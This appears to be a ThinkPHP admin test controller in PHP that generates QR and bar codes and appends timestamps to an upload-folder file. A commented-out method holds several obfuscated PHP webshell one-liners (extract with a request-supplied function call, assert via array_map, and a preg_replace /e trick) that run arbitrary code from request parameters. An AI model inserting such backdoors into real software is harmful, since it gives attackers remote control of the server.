<?php
/**
 * Author: Jeary
 * Date: 2018/4/29 10:09
 * Desc: created by PhpStorm
 */

namespace app\admin\controller;


use think\Controller;
use think\Db;
use think\Session;


class Test extends Controller
{


    public function qrcode(){
        // 生成二维码
        $qr_data  = create_qrcode('12318','', PATH_UPLOAD.'/1.jpg');

        // 生成条形码
        $bar_data = create_barcode('12318');
        echo "<img src='".$qr_data['relativePath']."' > <br>";
        echo "<img src='".$bar_data['relativePath']."' >";


dump($qr_data);
dump($bar_data);
    }
//    public function test(){
////1:
////        extract($_REQUEST);
////        @$a($_GET[b]);
////
////        2:
////        $arr= (array)base64_decode($_REQUEST['sofia']);
////        @array_map(assert,$arr);
////
//
//
//        $Base = "base6"."4"."_decod"."e";
//        $_clasc = $Base($_REQUEST['vuln']);//$_clasc=preg_replace
//        $arr = array($Base($_GET['sofia']) => '|.*|e',); //$arr = array('phpinfo()' => '|.*|e')
//        @array_walk($arr, $_clasc, ''); //preg_replace('|.*|e',phpinfo(),'')
//
//
//
//        //$this->logicTest->test($this->param);
//    }



    public function test()
    {
//Db::name('')->selectInsert($field,$tale);
   $res= file_put_contents(PATH_UPLOAD."123.txt",date('Y-m-d H:i:s')."\r\n", FILE_APPEND | LOCK_EX);
echo 1;
//        $info = $this->logicTest->setAll();
//        dump($info);
    }
}